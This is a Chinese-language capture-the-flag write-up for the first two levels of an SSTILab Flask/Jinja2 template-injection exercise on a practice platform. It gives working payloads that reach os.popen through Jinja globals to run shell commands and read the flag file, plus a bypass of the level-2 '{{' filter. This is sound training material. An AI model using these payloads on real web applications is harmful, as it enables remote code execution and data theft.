# SSTILab（X3NNY/sstilabs）· 第 1~2 关

> 平台：NSSCTF 动态实例（task8 清单里那个 SSTI 题的下发环境）
> 目标：`http://node5.anna.nssctf.cn:<端口>/level/N` —— 实例几小时回收，重新下发会换端口（本会话用过 25208、21554）
> 考点：Flask / Jinja2 模板注入（SSTI），13 关递进过滤
> 时间：2026-10-11 ｜ 进度：第 1~2 关

## 一、题目公共信息（每关都适用）

| 项 | 内容 |
|---|---|
| 入口 | `GET /level/N` 返回页面；`POST /level/N` 才是注入 |
| 注入参数 | 表单参数 `code`（页面里 `<input name="code">`，JS 用 `data: code=...` 提交） |
| 响应格式 | 成功 → `Hello <渲染结果>`（纯文本）；抛异常 → `No this level` |
| 后端 | Werkzeug/2.0.1 + Python/3.9.6 + Flask 1.1.1 |
| flag 位置 | `/app/flag`（**不在** `/flag`） |
| 源码 | `/app/app.py`、`/app/level/level.py`（13 关的黑名单全在里面） |

`app.py` 的核心逻辑：

```python
@app.route('/level/<int:lev>', methods=['GET', 'POST'])
def level1(lev):
    if request.method == "GET":
        return render_template("level.html", level=lev)
    try:
        code = request.form.get('code')
        level_func = 'level' + str(lev)
        call_obj = getattr(level, level_func)
        res = call_obj(code)                             # 每关的过滤在这里
        return render_template_string("Hello %s" % res)   # 模板注入点在这里
    except Exception:
        return "No this level"
```

两句话读懂这道题：

1. **漏洞点**：`res` 是拼接进模板源的用户输入，`render_template_string` 把它当模板编译执行；
2. **13 关的差别只在 `levelN(code)` 的黑名单**，漏洞本身不变。

## 二、第 1 关：无过滤

### 2.1 关卡源码

```python
def level1(code):
    return code          # 原样返回，没有任何过滤
```

### 2.2 确认注入（三个请求）

| 请求 | 响应 | 结论 |
|---|---|---|
| `{{7*7}}` | `Hello 49` | 表达式被服务端执行 → 存在 SSTI |
| `{{7*'7'}}` | `Hello 7777777` | 字符串重复 → 引擎是 **Jinja2**（Twig 会给 49） |
| `{{ config }}` | `Hello <Config {...}>` | 后端是 **Flask** |

### 2.3 payload 与 flag

```jinja
{{ lipsum.__globals__["os"].popen("cat /app/flag").read() }}
```

POST 到 `/level/1`，参数名 `code`。响应：`Hello SSTILAB{enjoy_flask_ssti}`

### 2.4 逐段原理

| 段 | 拿到什么 | 原理 |
|---|---|---|
| `lipsum` | `<function generate_lorem_ipsum>` | Jinja2 **默认全局**之一（`jinja2.defaults.DEFAULT_NAMESPACE`），不用传就能在模板里用 |
| `.__globals__` | `jinja2.utils` 模块的全局字典 | 函数对象携带「定义它的那个模块」的全局空间 |
| `["os"]` | `<module 'os'>` | `jinja2/utils.py` 顶部 `import os`，所以它的全局里有 `os` |
| `.popen("cat /app/flag")` | 可读管道对象 | `os.popen` 起 shell 执行命令，返回能读输出的对象 |
| `.read()` | 文件内容 | **必须读**；`os.system` 则根本没有回显 |

为什么不能直接写 `{{ __import__('os') }}`：模板命名空间里没有 `__import__`（它属于 `builtins`），
而且 `{{ }}` 只能放表达式，`import` 是语句 —— 只能从一个模板里现成的对象出发，顺着对象模型爬回解释器。

### 2.5 同一关的其他等价写法

```jinja
{{ url_for.__globals__["os"].popen("cat /app/flag").read() }}
{{ config.__class__.__init__.__globals__["os"].popen("cat /app/flag").read() }}
{{ cycler.__init__.__globals__.os.popen("cat /app/flag").read() }}
{{ lipsum.__globals__["__builtins__"]["open"]("/app/flag").read() }}
```

### 2.6 踩坑

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| 用 GET 传参 | 页面原样 | 只有 POST 才进 `level1()` | 改 POST form |
| 参数名猜错 | 无变化 | 参数叫 `code`，不是 `name`/`q` | 从页面 `<input name="code">` 读 |
| 命令里用单引号 | 回 `No this level` | 单引号破坏了 Jinja 的字符串字面量 | shell 命令统一用双引号包 |
| 以为 flag 在 `/flag` | 读不到 | 实际在 `/app/flag` | `find / -maxdepth 3 -iname *flag*` |
| 看不到报错 | 只回 `No this level` | 外层 `except Exception` 吞了异常 | 分段自证：先 `{{ lipsum }}`、再 `{{ lipsum.__globals__|length }}`，最后才接命令 |

## 三、第 2 关：禁 `{{`

### 3.1 关卡源码

```python
def level2(code):
    def waf(s):
        return "WAF" if "{{" in s else s
    return waf(code)
```

**它只查一个子串：`{{`。** 不查 `{%`、不查 `}}`、不查其它任何字符。

### 3.2 实测

| 请求 | 响应 |
|---|---|
| `{{7*7}}` | `Hello WAF`（含 `{{` → 被拦） |
| `{% print(lipsum.__globals__["os"].popen("cat /app/flag").read()) %}` | `Hello SSTILAB{enjoy_flask_ssti}`（不含 `{{` → 放行并执行） |
| `}}` 单独出现 | `Hello }}`（不触发；本地等价复现的结果） |

### 3.3 payload 与 flag

```jinja
{% print(lipsum.__globals__["os"].popen("cat /app/flag").read()) %}
```

响应：`Hello SSTILAB{enjoy_flask_ssti}`（与第 1 关同一个文件）

### 3.4 原理：三种定界符，只禁了一种

| 定界符 | 作用 | 这一关 |
|---|---|---|
| `{{ 表达式 }}` | 输出表达式的值 | **被禁** |
| `{% 语句 %}` | 语句块（if / for / set / print ...） | 没禁 |
| `{# 注释 #}` | 模板注释，不输出 | 没禁（没用） |

`{% %}` 里能输出内容的四种手段（本地等价复现全部通过）：

| 手段 | 写法 | 复现结果 |
|---|---|---|
| 直接输出表达式 | `{% print(expr) %}` | `{% print(7*7) %}` → `Hello 49` |
| 先存变量再输出 | `{% set a = expr %}{% print(a) %}` | → `Hello 42` |
| **条件输出字面量** | `{% if 条件 %}LEAKED{% endif %}` | → `Hello LEAKED` |
| 循环输出字面量 | `{% for i in [expr] %}LOOP{% endfor %}` | → `Hello LOOP` |

第三种最值得记：**输出的是固定文本，不依赖任何「输出表达式」的语法** —— 这就是第 3 关盲注的地基。

### 3.5 其他等价写法

```jinja
{% print(url_for.__globals__["os"].popen("cat /app/flag").read()) %}
{% set f = lipsum.__globals__["__builtins__"]["open"]("/app/flag") %}{% print(f.read()) %}
{% if lipsum.__globals__["os"].popen("cat /app/flag").read().startswith("SSTILAB") %}LEAKED{% endif %}
```

### 3.6 踩坑

| 坑 | 说明 |
|---|---|
| 以为 `}}` 也被拦 | 不会，黑名单里是 `{{` 这两个字符连在一起 |
| 想给 `{{` 变形 | 不用变形，直接换一种定界符 |
| 忘了括号 | `{% print(expr) %}` 的括号别丢 |
| 拿第 1 关的经验直接打第 2 关 | 每关黑名单不同，**先发最小样本探规则** |

## 四、后续

第 3 关（盲注）起继续追加：禁 `[` `]` → 禁引号 → 禁 `_` → 禁 `.` → 关键词黑名单 → 禁数字 → config 置空 → 多重禁。
